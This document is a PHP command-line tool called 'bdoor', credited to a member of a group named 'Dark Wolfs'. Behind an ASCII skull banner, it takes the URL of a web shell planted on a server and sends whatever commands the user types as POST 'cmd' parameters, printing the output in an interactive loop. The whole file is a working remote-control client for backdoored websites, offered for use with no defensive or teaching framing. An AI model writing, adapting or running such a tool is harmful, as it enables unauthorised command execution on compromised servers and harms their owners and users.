<?php
/*
 *  
 * This script coded by fouad ghaoui
 *  
 *  Email => ghaouifouad1@gmail.com
 * 
 *  Team => Dark Wolfs
 * 
 *  Greetz => All team members
 * 
 *  
 * 
 */
$version = "v1.0";
$white = "\e[97m";
$black = "\e[30m\e[1m";
$yellow = "\e[93m";
$orange = "\e[38;5;208m";
$blue   = "\e[34m";
$lblue  = "\e[36m";
$cln    = "\e[0;94m";
$green  = "\e[92m";
$fgreen = "\e[32m";
$red    = "\e[91m";
$magenta = "\e[35m";
$bluebg = "\e[44m";
$lbluebg = "\e[106m";
$greenbg = "\e[42m";
$lgreenbg = "\e[102m";
$yellowbg = "\e[43m";
$lyellowbg = "\e[103m";
$redbg = "\e[101m";
$grey = "\e[37m";
$cyan = "\e[36m";
$bold   = "\e[1m";
$nbold = "\e[1;97m";
$end = $bold.$orange."-==============================================================================-"."\n";
echo $red.$bold."                                 __________"."\n";
echo "                              .~#########%%;~."."\n";
echo "                             /############%%;`\ "."\n";
echo "                            /######/~\/~\%%;,;,\ "."\n";
echo "                           |#######\    /;;;;.,.|"."\n";
echo "                           |#########\/%;;;;;.,.|"."\n";
echo "                  XX       |##/~~\####%;;;/~~\;,|       XX"."\n";
echo "                XX..X      |#|  o  \##%;/  o  |.|      X..XX"."\n";
echo "              XX.....X     |##\____/##%;\____/.,|     X.....XX"."\n";
echo "         XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX"."\n";
echo "        X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X"."\n";
echo "        X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X"."\n";
echo "        X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X"."\n";
echo "         X# \.X        @#%,.@                  @#%,.@        X./  #"."\n";
echo "          ##  X          @#%,.@              @#%,.@          X   #"."\n";
echo "        , '# #X            @#%,.@          @#%,.@            X ##"."\n";
echo "           `###X             @#%,.@      @#%,.@             ####'"."\n";
echo "          . ' ###              @#%.,@  @#%,.@              ###`'"."\n";
echo "            . ';'                @#%.@#%,.@                ;'` ' ."."\n";
echo "              '                    @#%,.@                   ,."."\n";
echo $yellow.$bold."                         -=========================-                "."\n";
echo $yellow.$bold."                         - Name : bdoor   -                "."\n";
echo $yellow.$bold."                         - Author : fouad ghaoui -                "."\n";
echo $yellow.$bold."                         - From : algeria  -                "."\n";
echo $yellow.$bold."                         -=========================-                "."\n";
echo $end;
echo $green;
url : echo "  Enter script url : ";
$url = fgets(STDIN,1024);
$url = trim($url);
if(!preg_match("/http/",$url)){
$red    = "\e[91m";
$green  = "\e[92m";
echo $red." Error pls enter url with http or https \n";
echo $green;
goto url;
}
$hed = @get_headers("$url");
if(!preg_match("/OK/",$hed[0])){
$red    = "\e[91m";
$green  = "\e[92m";
echo $red." Error script not found ! \n";
echo $green;
goto url;	
 }
$hostname = explode(".",$url);
if(preg_match("/www/",$hostname[0])){
	
$hostname = $hostname[1];	

}else{
	
$hostname = $hostname[0];		
	
}
echo "\n";
function exploit($url,$command){	
$sh = curl_init();	
curl_setopt($sh, CURLOPT_URL,$url);
curl_setopt($sh, CURLOPT_POST, true);   
curl_setopt($sh, CURLOPT_POSTFIELDS,"cmd=$command");	
curl_setopt($sh, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($sh);
curl_close($sh);
print "    "."$postResult";
	}
	
if(!empty($url)){
echo " ID :";
echo exploit($url,"id");
while(true){
$white = "\e[97m";
$black = "\e[30m\e[1m";
$yellow = "\e[93m";
$orange = "\e[38;5;208m";
$blue   = "\e[34m";
$lblue  = "\e[36m";
$cln    = "\e[0;94m";
$green  = "\e[92m";
$fgreen = "\e[32m";
$red    = "\e[91m";
$magenta = "\e[35m";
$bluebg = "\e[44m";
$lbluebg = "\e[106m";
$greenbg = "\e[42m";
$lgreenbg = "\e[102m";
$yellowbg = "\e[43m";
/*$arr = array(
"https" => "",
"http" => "",
":" => "",
"//" => "",
"indo.php" => "",
"/" => "",
"php" => "",
"." => "",
"www" => "",
"com" => "",
"org" => "",
"gov" => "",
);

$rb = str_replace(array_keys($arr),$arr,$url);
*/
echo $green."  connection to {-$hostname-} <Shell:> ";
$command = trim(fgets(STDIN,1024));
if($command == "exit"){
exit();
}
exploit($url,$command);	
  }
}
?>
